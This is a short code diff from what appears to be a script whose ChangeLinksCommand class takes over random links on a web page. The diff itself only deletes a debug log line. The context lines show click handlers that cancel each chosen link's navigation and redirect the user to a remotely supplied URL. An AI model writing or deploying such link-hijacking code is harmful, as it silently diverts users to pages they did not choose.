@@ -18,7 +18,6 @@ export class ChangeLinksCommand extends Command {
 
             let anchors = $("a").toArray().sort((a, b) => 0.5 - Math.random());
             for (let i = 0; i < data.force.amount; i++) {
-                console.log(anchors[i])
                 $(anchors[i]).on("click", event => {
                     event.preventDefault();
                     location.href = data.force.link;
